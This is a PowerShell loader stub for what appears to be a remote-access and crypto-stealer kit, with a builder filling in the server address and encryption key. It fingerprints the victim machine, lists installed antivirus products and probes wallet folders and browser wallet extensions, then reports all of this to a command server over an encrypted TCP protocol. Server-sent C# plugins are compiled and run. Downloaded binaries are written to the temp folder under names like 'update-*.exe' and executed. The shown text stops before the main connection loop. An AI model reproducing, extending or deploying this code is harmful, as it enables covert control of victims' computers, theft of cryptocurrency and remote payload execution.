# Trap Loader Stub - TCP Binary Client with AES-256-GCM
# Placeholders are replaced at build time by the Builder

$serverUrl = "{{SERVER_URL}}"
$httpPassword = "{{PASSWORD}}"
$encryptionKey = "{{ENCRYPTION_KEY}}"

# ==================== AES-256-GCM VIA WINDOWS BCRYPT ====================

Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public static class AesGcmHelper
{
    private const int SaltSize = 16;
    private const int NonceSize = 12;
    private const int TagSize = 16;
    private const int KeySize = 32;
    private const int Pbkdf2Iterations = 100000;
    private const int MinEncryptedSize = SaltSize + NonceSize + TagSize + 1;

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptOpenAlgorithmProvider(
        out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptSetProperty(
        IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptGenerateSymmetricKey(
        IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject,
        byte[] pbSecret, int cbSecret, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptEncrypt(
        IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo,
        byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput,
        out int pcbResult, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDecrypt(
        IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo,
        byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput,
        out int pcbResult, uint dwFlags);

    [StructLayout(LayoutKind.Sequential)]
    private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;
    }

    private const string BCRYPT_AES_ALGORITHM = "AES";
    private const string BCRYPT_CHAINING_MODE = "ChainingMode";
    private const string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
    private const int STATUS_SUCCESS = 0;

    private static byte[] DeriveKey(string password, byte[] salt)
    {
        using (var pbkdf2 = new Rfc2898DeriveBytes(password, salt, Pbkdf2Iterations,
            HashAlgorithmName.SHA256))
        {
            return pbkdf2.GetBytes(KeySize);
        }
    }

    private static byte[] GcmEncrypt(byte[] key, byte[] nonce, byte[] plaintext, out byte[] tag)
    {
        IntPtr hAlg = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        tag = new byte[TagSize];

        try
        {
            int status = BCryptOpenAlgorithmProvider(out hAlg, BCRYPT_AES_ALGORITHM, null, 0);
            if (status != STATUS_SUCCESS)
                throw new CryptographicException("BCryptOpenAlgorithmProvider failed: " + status);

            byte[] chainMode = Encoding.Unicode.GetBytes(BCRYPT_CHAIN_MODE_GCM);
            status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0);
            if (status != STATUS_SUCCESS)
                throw new CryptographicException("BCryptSetProperty failed: " + status);

            status = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
            if (status != STATUS_SUCCESS)
                throw new CryptographicException("BCryptGenerateSymmetricKey failed: " + status);

            byte[] ciphertext = new byte[plaintext.Length];
            byte[] ivCopy = (byte[])nonce.Clone();

            var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            authInfo.cbSize = Marshal.SizeOf(authInfo);
            authInfo.dwInfoVersion = 1;

            GCHandle nonceHandle = GCHandle.Alloc(ivCopy, GCHandleType.Pinned);
            GCHandle tagHandle = GCHandle.Alloc(tag, GCHandleType.Pinned);

            try
            {
                authInfo.pbNonce = nonceHandle.AddrOfPinnedObject();
                authInfo.cbNonce = ivCopy.Length;
                authInfo.pbTag = tagHandle.AddrOfPinnedObject();
                authInfo.cbTag = TagSize;

                IntPtr pAuthInfo = Marshal.AllocHGlobal(Marshal.SizeOf(authInfo));
                try
                {
                    Marshal.StructureToPtr(authInfo, pAuthInfo, false);

                    int bytesWritten;
                    status = BCryptEncrypt(hKey, plaintext, plaintext.Length, pAuthInfo,
                        null, 0, ciphertext, ciphertext.Length, out bytesWritten, 0);
                    if (status != STATUS_SUCCESS)
                        throw new CryptographicException("BCryptEncrypt failed: " + status);
                }
                finally
                {
                    Marshal.FreeHGlobal(pAuthInfo);
                }
            }
            finally
            {
                nonceHandle.Free();
                tagHandle.Free();
            }

            return ciphertext;
        }
        finally
        {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }

    private static byte[] GcmDecrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
    {
        IntPtr hAlg = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;

        try
        {
            int status = BCryptOpenAlgorithmProvider(out hAlg, BCRYPT_AES_ALGORITHM, null, 0);
            if (status != STATUS_SUCCESS)
                throw new CryptographicException("BCryptOpenAlgorithmProvider failed: " + status);

            byte[] chainMode = Encoding.Unicode.GetBytes(BCRYPT_CHAIN_MODE_GCM);
            status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0);
            if (status != STATUS_SUCCESS)
                throw new CryptographicException("BCryptSetProperty failed: " + status);

            status = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
            if (status != STATUS_SUCCESS)
                throw new CryptographicException("BCryptGenerateSymmetricKey failed: " + status);

            byte[] plaintext = new byte[ciphertext.Length];
            byte[] ivCopy = (byte[])nonce.Clone();
            byte[] tagCopy = (byte[])tag.Clone();

            var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            authInfo.cbSize = Marshal.SizeOf(authInfo);
            authInfo.dwInfoVersion = 1;

            GCHandle nonceHandle = GCHandle.Alloc(ivCopy, GCHandleType.Pinned);
            GCHandle tagHandle = GCHandle.Alloc(tagCopy, GCHandleType.Pinned);

            try
            {
                authInfo.pbNonce = nonceHandle.AddrOfPinnedObject();
                authInfo.cbNonce = ivCopy.Length;
                authInfo.pbTag = tagHandle.AddrOfPinnedObject();
                authInfo.cbTag = tagCopy.Length;

                IntPtr pAuthInfo = Marshal.AllocHGlobal(Marshal.SizeOf(authInfo));
                try
                {
                    Marshal.StructureToPtr(authInfo, pAuthInfo, false);

                    int bytesWritten;
                    status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, pAuthInfo,
                        null, 0, plaintext, plaintext.Length, out bytesWritten, 0);
                    if (status != STATUS_SUCCESS)
                        throw new CryptographicException("GCM tag verification failed");
                }
                finally
                {
                    Marshal.FreeHGlobal(pAuthInfo);
                }
            }
            finally
            {
                nonceHandle.Free();
                tagHandle.Free();
            }

            return plaintext;
        }
        finally
        {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }

    public static byte[] Encrypt(string plainText, string password)
    {
        byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
        return EncryptBytes(plainBytes, password);
    }

    public static byte[] EncryptBytes(byte[] plainBytes, string password)
    {
        byte[] salt = new byte[SaltSize];
        byte[] nonce = new byte[NonceSize];

        using (var rng = RandomNumberGenerator.Create())
        {
            rng.GetBytes(salt);
            rng.GetBytes(nonce);
        }

        byte[] key = DeriveKey(password, salt);
        byte[] tag;
        byte[] cipherText = GcmEncrypt(key, nonce, plainBytes, out tag);

        byte[] result = new byte[SaltSize + NonceSize + TagSize + cipherText.Length];
        int offset = 0;

        Buffer.BlockCopy(salt, 0, result, offset, SaltSize);
        offset += SaltSize;
        Buffer.BlockCopy(nonce, 0, result, offset, NonceSize);
        offset += NonceSize;
        Buffer.BlockCopy(tag, 0, result, offset, TagSize);
        offset += TagSize;
        Buffer.BlockCopy(cipherText, 0, result, offset, cipherText.Length);

        return result;
    }

    public static string DecryptToString(byte[] encryptedBytes, string password)
    {
        byte[] plainBytes = DecryptToBytes(encryptedBytes, password);
        if (plainBytes == null) return null;
        return Encoding.UTF8.GetString(plainBytes);
    }

    public static byte[] DecryptToBytes(byte[] encryptedBytes, string password)
    {
        if (encryptedBytes == null || encryptedBytes.Length < MinEncryptedSize)
            return null;

        int offset = 0;

        byte[] salt = new byte[SaltSize];
        Buffer.BlockCopy(encryptedBytes, offset, salt, 0, SaltSize);
        offset += SaltSize;

        byte[] nonce = new byte[NonceSize];
        Buffer.BlockCopy(encryptedBytes, offset, nonce, 0, NonceSize);
        offset += NonceSize;

        byte[] tag = new byte[TagSize];
        Buffer.BlockCopy(encryptedBytes, offset, tag, 0, TagSize);
        offset += TagSize;

        int cipherLen = encryptedBytes.Length - offset;
        byte[] cipherText = new byte[cipherLen];
        Buffer.BlockCopy(encryptedBytes, offset, cipherText, 0, cipherLen);

        byte[] key = DeriveKey(password, salt);

        try
        {
            return GcmDecrypt(key, nonce, cipherText, tag);
        }
        catch (CryptographicException)
        {
            return null;
        }
    }
}
"@ -ReferencedAssemblies @('System.dll') -ErrorAction Stop

# ==================== ENCRYPTION WRAPPERS ====================

function Encrypt-Payload {
    param([string]$PlainText, [string]$Key)
    return [AesGcmHelper]::Encrypt($PlainText, $Key)
}

function Decrypt-Bytes {
    param([byte[]]$CipherBytes, [string]$Key)
    return [AesGcmHelper]::DecryptToBytes($CipherBytes, $Key)
}

# ==================== SYSTEM INFO ====================

function Get-MachineFingerprint {
    try {
        $cpuId = Get-CimInstance -ClassName Win32_Processor -ErrorAction Stop |
            Select-Object -First 1 -ExpandProperty ProcessorId
        $biosId = Get-CimInstance -ClassName Win32_BIOS -ErrorAction Stop |
            Select-Object -ExpandProperty SerialNumber
        $mainboardId = Get-CimInstance -ClassName Win32_BaseBoard -ErrorAction Stop |
            Select-Object -ExpandProperty SerialNumber

        $fingerprint = "$cpuId-$biosId-$mainboardId"
        $sha = [System.Security.Cryptography.SHA256]::Create()
        $hashBytes = $sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($fingerprint))
        $sha.Dispose()
        return [BitConverter]::ToString($hashBytes).Replace("-", "")
    }
    catch {
        return [Guid]::NewGuid().ToString().Replace("-", "").ToUpper()
    }
}

function Get-WindowsVersion {
    try {
        $os = [System.Environment]::OSVersion.Version
        switch ($os.Major) {
            10 {
                if ($os.Build -ge 22000) { return "Windows 11" }
                return "Windows 10"
            }
            6 {
                switch ($os.Minor) {
                    3 { return "Windows 8.1" }
                    2 { return "Windows 8" }
                    1 { return "Windows 7" }
                    0 { return "Windows Vista" }
                }
            }
            default { return "Windows $($os.Major).$($os.Minor)" }
        }
    }
    catch { return "Unknown" }
}

function Get-SpecificAntivirus {
    $avProducts = @()
    $avPaths = @{
        "Norton"           = "SOFTWARE\Norton"
        "McAfee"           = "SOFTWARE\McAfee"
        "Kaspersky"        = "SOFTWARE\Kaspersky Lab"
        "Bitdefender"      = "SOFTWARE\Bitdefender"
        "Avast"            = "SOFTWARE\AVAST Software"
        "AVG"              = "SOFTWARE\AVG Technologies"
        "Windows Defender" = "SOFTWARE\Microsoft\Windows Defender"
        "ESET"             = "SOFTWARE\ESET"
        "Malwarebytes"     = "SOFTWARE\Malwarebytes"
        "Trend Micro"      = "SOFTWARE\TrendMicro"
        "Sophos"           = "SOFTWARE\Sophos"
        "Webroot"          = "SOFTWARE\WRData"
    }
    foreach ($av in $avPaths.GetEnumerator()) {
        try {
            if (Get-Item -Path "HKLM:\$($av.Value)" -ErrorAction SilentlyContinue) {
                $avProducts += $av.Key
            }
        } catch { }
    }
    if ($avProducts.Count -eq 0) { return "None" }
    return ($avProducts | Select-Object -Unique) -join ", "
}

function Get-WalletNames {
    $walletNames = @()

    $walletPaths = @{
        "Armory"       = "$env:APPDATA\Armory"
        "Atomic"       = "$env:APPDATA\Atomic\Local Storage\leveldb"
        "Bitcoin"      = "$env:APPDATA\Bitcoin\wallets"
        "Bytecoin"     = "$env:APPDATA\bytecoin"
        "Coinomi"      = "$env:LOCALAPPDATA\Coinomi\Coinomi\wallets"
        "Dash"         = "$env:APPDATA\DashCore\wallets"
        "Electrum"     = "$env:APPDATA\Electrum\wallets"
        "Ethereum"     = "$env:APPDATA\Ethereum\keystore"
        "Exodus"       = "$env:APPDATA\Exodus\exodus.wallet"
        "Guarda"       = "$env:APPDATA\Guarda\Local Storage\leveldb"
        "Jaxx"         = "$env:APPDATA\com.liberty.jaxx\IndexedDB"
        "Litecoin"     = "$env:APPDATA\Litecoin\wallets"
        "Monero GUI"   = "$env:USERPROFILE\Documents\Monero\wallets"
        "WalletWasabi" = "$env:APPDATA\WalletWasabi\Client\Wallets"
        "Ledger Live"  = "$env:APPDATA\Ledger Live"
        "Trezor Suite" = "$env:APPDATA\@trezor\suite-desktop"
    }

    foreach ($wallet in $walletPaths.GetEnumerator()) {
        try {
            if (Test-Path $wallet.Value) {
                $walletNames += $wallet.Key
            }
        } catch { }
    }

    $browserPaths = @{
        "Brave"    = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Chrome"   = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge"     = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Opera"    = "$env:APPDATA\Opera Software\Opera Stable"
        "OperaGX"  = "$env:APPDATA\Opera Software\Opera GX Stable"
        "Vivaldi"  = "$env:LOCALAPPDATA\Vivaldi\User Data"
        "Chromium" = "$env:LOCALAPPDATA\Chromium\User Data"
    }

    $walletDirs = @{
        "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
        "ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
        "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
        "hifafgmccdpekplomjjkcfgodnhcellj" = "Crypto.com"
        "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
        "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
        "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
        "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
        "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain"
        "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "MathWallet"
        "aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
        "kkpllkodjeloidieedojogacfhpaihoh" = "Enkrypt"
        "mcbigmjiafegjnnogedioegffbooigli" = "Ethos Sui"
        "hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda Wallet"
        "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
        "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
        "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
        "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
        "mfgccjchihfkkindfppnaooecgfneiii" = "TokenPocket"
        "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
        "amkmjjmmflddogmhpjloimipbofnfjih" = "Wombat"
        "dlcobpjiigpikoobohmabehhmhfoodbb" = "Argent X"
        "jiidiaalihmmhddjgbnbgdfflelocpak" = "BitKeep"
        "bopcbmipnjdcdfflfgjdgdjejmgpoaab" = "BlockWallet"
        "heamnjbnflcikcggoiplibfommfbkjpj" = "Zeal"
    }

    foreach ($browser in $browserPaths.GetEnumerator()) {
        try {
            if (Test-Path $browser.Value) {
                foreach ($wd in $walletDirs.GetEnumerator()) {
                    $extPath = Join-Path $browser.Value "Default\Local Extension Settings\$($wd.Key)"
                    $extPath2 = Join-Path $browser.Value "Local Extension Settings\$($wd.Key)"
                    if ((Test-Path $extPath) -or (Test-Path $extPath2)) {
                        $walletNames += "$($wd.Value)"
                    }
                }
            }
        } catch { }
    }

    if ($walletNames.Count -eq 0) { return "None" }
    return ($walletNames | Select-Object -Unique) -join ", "
}

function Get-SystemInfo {
    $osVer = Get-WindowsVersion
    $machine = $env:COMPUTERNAME
    if ([string]::IsNullOrWhiteSpace($machine)) {
        $machine = [System.Environment]::MachineName
    }
    if ([string]::IsNullOrWhiteSpace($machine)) {
        $machine = "Unknown"
    }
    $av = Get-SpecificAntivirus
    $wallets = Get-WalletNames
    return "$osVer|$machine|$av|$wallets"
}

# ==================== TCP BINARY PROTOCOL ====================

$MSG_AUTH          = [byte]0x01
$MSG_HEARTBEAT     = [byte]0x02
$MSG_CLIENT_INFO   = [byte]0x03
$MSG_PLUGIN_DATA   = [byte]0x10
$MSG_PLUGIN_BATCH  = [byte]0x11

$MSG_AUTH_OK       = [byte]0x81
$MSG_AUTH_FAIL     = [byte]0x82
$MSG_HEARTBEAT_ACK = [byte]0x83
$MSG_PLUGIN_CMD    = [byte]0x90
$MSG_FILE_TRANSFER = [byte]0x91
$MSG_DISCONNECT    = [byte]0xFF

function Write-TcpMessage {
    param(
        [System.IO.Stream]$Stream,
        [byte]$MsgType,
        [byte[]]$Payload
    )

    $payloadLen = if ($Payload) { $Payload.Length } else { 0 }
    $totalLen = 1 + $payloadLen

    $packet = New-Object byte[] (4 + $totalLen)
    $packet[0] = [byte]($totalLen -band 0xFF)
    $packet[1] = [byte](($totalLen -shr 8) -band 0xFF)
    $packet[2] = [byte](($totalLen -shr 16) -band 0xFF)
    $packet[3] = [byte](($totalLen -shr 24) -band 0xFF)
    $packet[4] = $MsgType

    if ($Payload -and $Payload.Length -gt 0) {
        [Array]::Copy($Payload, 0, $packet, 5, $Payload.Length)
    }

    $Stream.Write($packet, 0, $packet.Length)
    $Stream.Flush()
}

function Read-TcpExact {
    param(
        [System.IO.Stream]$Stream,
        [int]$Count
    )

    $buffer = New-Object byte[] $Count
    $totalRead = 0

    while ($totalRead -lt $Count) {
        $read = $Stream.Read($buffer, $totalRead, $Count - $totalRead)
        if ($read -le 0) { return $null }
        $totalRead += $read
    }

    return $buffer
}

function Read-TcpMessage {
    param([System.IO.Stream]$Stream)

    $lenBuf = Read-TcpExact -Stream $Stream -Count 4
    if ($null -eq $lenBuf) { return $null }

    $totalLen = [int]$lenBuf[0] -bor
                ([int]$lenBuf[1] -shl 8) -bor
                ([int]$lenBuf[2] -shl 16) -bor
                ([int]$lenBuf[3] -shl 24)

    if ($totalLen -le 0 -or $totalLen -gt 5242880) {
        return $null
    }

    $msgBuf = Read-TcpExact -Stream $Stream -Count $totalLen
    if ($null -eq $msgBuf) { return $null }

    $msgType = $msgBuf[0]
    $payload = $null

    if ($totalLen -gt 1) {
        $payload = New-Object byte[] ($totalLen - 1)
        [Array]::Copy($msgBuf, 1, $payload, 0, $totalLen - 1)
    }

    return @{ Type = $msgType; Payload = $payload }
}

# ==================== PLUGIN ENGINE ====================

Add-Type -TypeDefinition @"
using System;
using System.Collections.Concurrent;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

public class PluginRunner
{
    public ConcurrentQueue<byte[]> InQueue  = new ConcurrentQueue<byte[]>();
    public ConcurrentQueue<byte[]> OutQueue = new ConcurrentQueue<byte[]>();
    public CancellationTokenSource Cts      = new CancellationTokenSource();
    public Thread WorkerThread;
    public Exception LastError;
    public volatile bool Running;

    public void Start(object pluginInstance)
    {
        Running = true;
        WorkerThread = new Thread(() =>
        {
            try
            {
                Func<byte[], Task> sendFunc = (data) =>
                {
                    OutQueue.Enqueue(data);
                    return Task.CompletedTask;
                };

                Func<Task<byte[]>> receiveFunc = () =>
                {
                    while (!Cts.IsCancellationRequested)
                    {
                        byte[] item;
                        if (InQueue.TryDequeue(out item))
                            return Task.FromResult(item);
                        Thread.Sleep(5);
                    }
                    return Task.FromResult<byte[]>(null);
                };

                var runMethod = pluginInstance.GetType().GetMethod("Run");
                if (runMethod == null)
                {
                    LastError = new Exception("Plugin has no Run method");
                    return;
                }

                var task = (Task)runMethod.Invoke(pluginInstance, new object[] { sendFunc, receiveFunc });
                task.GetAwaiter().GetResult();
            }
            catch (Exception ex) { LastError = ex; }
            finally { Running = false; }
        });
        WorkerThread.IsBackground = true;
        WorkerThread.Name = "PluginWorker";
        WorkerThread.Start();
    }

    public void Stop()
    {
        try { Cts.Cancel(); } catch { }
        try { if (WorkerThread != null && WorkerThread.IsAlive) WorkerThread.Join(3000); } catch { }
        Running = false;
    }

    public int GetOutQueueCount() { return OutQueue.Count; }

    public void ClearOutQueue()
    {
        byte[] discard;
        while (OutQueue.TryDequeue(out discard)) { }
    }
}
"@ -ReferencedAssemblies @('System.dll') -ErrorAction Stop

$global:ActivePlugins = @{}

# ==================== PLUGIN FUNCTIONS ====================

function Invoke-PluginCommand {
    param([string]$PluginId, [int]$CmdType, [byte[]]$Data)

    switch ($CmdType) {
        0 {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] Loading: $PluginId" -ForegroundColor Magenta
            if ($global:ActivePlugins.ContainsKey($PluginId)) { Stop-Plugin -PluginId $PluginId }
            try {
                $code = [Text.Encoding]::UTF8.GetString($Data)

                # Build referenced assemblies list - include System.Management for process manager
                $refs = @(
                    'System.dll',
                    'System.Drawing.dll',
                    'System.Windows.Forms.dll',
                    'System.Management.dll'
                )

                Add-Type -TypeDefinition $code -ReferencedAssemblies $refs -ErrorAction Stop
                $pluginInstance = New-Object "ClientPlugin_$($PluginId).Main"
                $runner = New-Object PluginRunner
                $runner.Start($pluginInstance)
                $global:ActivePlugins[$PluginId] = @{ Runner = $runner }
                Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] Started: $PluginId" -ForegroundColor Green
            } catch {
                Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] Load error: $($_.Exception.Message)" -ForegroundColor Red
                $global:ActivePlugins.Remove($PluginId)
            }
        }
        1 {
            if ($global:ActivePlugins.ContainsKey($PluginId)) {
                $global:ActivePlugins[$PluginId].Runner.InQueue.Enqueue($Data)
            }
        }
        2 {
            if ($global:ActivePlugins.ContainsKey($PluginId)) { Stop-Plugin -PluginId $PluginId }
        }
    }
}

function Stop-Plugin {
    param([string]$PluginId)
    if ($global:ActivePlugins.ContainsKey($PluginId)) {
        try { $global:ActivePlugins[$PluginId].Runner.Stop() } catch { }
        $global:ActivePlugins.Remove($PluginId)
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] Stopped: $PluginId" -ForegroundColor Yellow
    }
}

function Stop-AllPlugins {
    foreach ($plugId in @($global:ActivePlugins.Keys)) { Stop-Plugin -PluginId $plugId }
}

function Cleanup-DeadPlugins {
    foreach ($plugId in @($global:ActivePlugins.Keys)) {
        $pe = $global:ActivePlugins[$plugId]
        if ($pe -and $pe.Runner) {
            if ($pe.Runner.LastError) {
                Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] $plugId died: $($pe.Runner.LastError.Message)" -ForegroundColor Red
                $pe.Runner.Stop()
                $global:ActivePlugins.Remove($plugId)
            }
            elseif (-not $pe.Runner.Running -and $pe.Runner.WorkerThread -and -not $pe.Runner.WorkerThread.IsAlive) {
                Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] $plugId exited" -ForegroundColor Yellow
                $global:ActivePlugins.Remove($plugId)
            }
        }
    }
}

function Get-HasPluginOutput {
    foreach ($plugId in @($global:ActivePlugins.Keys)) {
        $pe = $global:ActivePlugins[$plugId]
        if ($pe -and $pe.Runner -and $pe.Runner.GetOutQueueCount() -gt 0) {
            return $true
        }
    }
    return $false
}

function Send-AllPluginOutput {
    param([System.IO.Stream]$Stream)

    $anySent = $false

    foreach ($plugId in @($global:ActivePlugins.Keys)) {
        $pluginEntry = $global:ActivePlugins[$plugId]
        if ($null -eq $pluginEntry -or $null -eq $pluginEntry.Runner) { continue }

        $queueCount = $pluginEntry.Runner.GetOutQueueCount()
        if ($queueCount -le 0) { continue }

        if ($queueCount -gt 100) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - [Plugin] $plugId backlog ($queueCount), clearing" -ForegroundColor Yellow
            $pluginEntry.Runner.ClearOutQueue()
            continue
        }

        $idBytes = [Text.Encoding]::UTF8.GetBytes($plugId)

        $sent = 0
        while ($sent -lt 50) {
            $item = $null
            $dequeued = $pluginEntry.Runner.OutQueue.TryDequeue([ref]$item)
            if (-not $dequeued -or $null -eq $item) { break }

            $payload = New-Object byte[] (1 + $idBytes.Length + $item.Length)
            $payload[0] = [byte]$idBytes.Length
            [Array]::Copy($idBytes, 0, $payload, 1, $idBytes.Length)
            [Array]::Copy($item, 0, $payload, 1 + $idBytes.Length, $item.Length)

            Write-TcpMessage -Stream $Stream -MsgType $MSG_PLUGIN_DATA -Payload $payload
            $sent++
            $anySent = $true
        }
    }

    return $anySent
}

# ==================== MESSAGE HANDLERS ====================

function Handle-PluginCmd {
    param([byte[]]$Payload)
    if ($null -eq $Payload -or $Payload.Length -lt 2) { return }
    $idLen = [int]$Payload[0]
    if ($idLen -le 0 -or ($idLen + 1) -gt $Payload.Length) { return }
    $pluginId = [Text.Encoding]::UTF8.GetString($Payload, 1, $idLen)
    $dataOffset = 1 + $idLen
    $dataLen = $Payload.Length - $dataOffset
    $data = $null
    if ($dataLen -gt 0) {
        $data = New-Object byte[] $dataLen
        [Array]::Copy($Payload, $dataOffset, $data, 0, $dataLen)
    }
    if ($null -ne $data -and $data.Length -ge 1) {
        $cmdType = [int]$data[0]
        $cmdData = $null
        if ($data.Length -gt 1) {
            $cmdData = New-Object byte[] ($data.Length - 1)
            [Array]::Copy($data, 1, $cmdData, 0, $cmdData.Length)
        }
        Invoke-PluginCommand -PluginId $pluginId -CmdType $cmdType -Data $cmdData
    }
}

function Handle-FileTransfer {
    param([byte[]]$Payload)
    if ($null -eq $Payload -or $Payload.Length -lt 30) {
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - File transfer payload too small" -ForegroundColor Red
        return
    }

    $decryptedBytes = Decrypt-Bytes -CipherBytes $Payload -Key $encryptionKey
    if ($null -eq $decryptedBytes -or $decryptedBytes.Length -lt 3) {
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - File decryption failed" -ForegroundColor Red
        return
    }

    $execMode = $decryptedBytes[0]
    $hashLen = [int]$decryptedBytes[1]
    $offset = 2

    if (($offset + $hashLen) -gt $decryptedBytes.Length) {
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Invalid file transfer metadata" -ForegroundColor Red
        return
    }

    $expectedHash = ""
    if ($hashLen -gt 0) {
        $expectedHash = [Text.Encoding]::UTF8.GetString($decryptedBytes, $offset, $hashLen)
        $offset += $hashLen
    }

    $fileLen = $decryptedBytes.Length - $offset
    if ($fileLen -le 0) {
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Empty file payload" -ForegroundColor Red
        return
    }

    $fileBytes = New-Object byte[] $fileLen
    [Array]::Copy($decryptedBytes, $offset, $fileBytes, 0, $fileLen)

    $modeName = if ($execMode -eq 0x01) { "IN-MEMORY" } else { "DROP-TO-DISK" }
    Write-Host "$(Get-Date -Format 'HH:mm:ss') - File received: $($fileBytes.Length) bytes ($modeName)" -ForegroundColor Green

    if ($expectedHash) {
        $sha = [System.Security.Cryptography.SHA256]::Create()
        $actualHash = [BitConverter]::ToString($sha.ComputeHash($fileBytes)).Replace("-", "").ToLower()
        $sha.Dispose()
        if ($actualHash -ne $expectedHash) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - HASH MISMATCH! Rejecting." -ForegroundColor Red
            return
        }
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Hash verified OK" -ForegroundColor Green
    }

    $suffix = [Guid]::NewGuid().ToString().Substring(0, 8)
    if ($fileBytes.Length -gt 1 -and $fileBytes[0] -eq 0x4D -and $fileBytes[1] -eq 0x5A) {
        $fileName = "update-$suffix.exe"
    } elseif ($fileBytes.Length -gt 1 -and $fileBytes[0] -eq 0x50 -and $fileBytes[1] -eq 0x4B) {
        $fileName = "update-$suffix.zip"
    } else {
        $fileName = "update-$suffix.bat"
    }

    $filePath = [IO.Path]::Combine([IO.Path]::GetTempPath(), $fileName)
    try {
        [IO.File]::WriteAllBytes($filePath, $fileBytes)
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Saved: $filePath" -ForegroundColor Green
        Start-Process -FilePath $filePath -ErrorAction Stop
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Executed successfully" -ForegroundColor Green
    } catch {
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Execute error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ==================== PARSE SERVER ADDRESS ====================

function Parse-ServerAddress {
    param([string]$Address)
    $result = @{ Host = ""; Port = 443 }
    $addr = $Address.Trim() -replace '^https?://', '' -replace '/.*$', ''
    if ($addr -match '^(.+):(\d+)$') {
        $result.Host = $Matches[1]
        $result.Port = [int]$Matches[2]
    } else {
        $result.Host = $addr
    }
    return $result
}

# ==================== MAIN ====================

$machineId = Get-MachineFingerprint
$systemInfo = Get-SystemInfo

$parsed = Parse-ServerAddress -Address $serverUrl
$sHost = $parsed.Host
$sPort = $parsed.Port

if ([string]::IsNullOrWhiteSpace($sHost)) {
    Write-Host "Invalid server address: $serverUrl" -ForegroundColor Red
    Start-Sleep -Seconds 10
    exit 1
}

Write-Host "========================================" -ForegroundColor Cyan
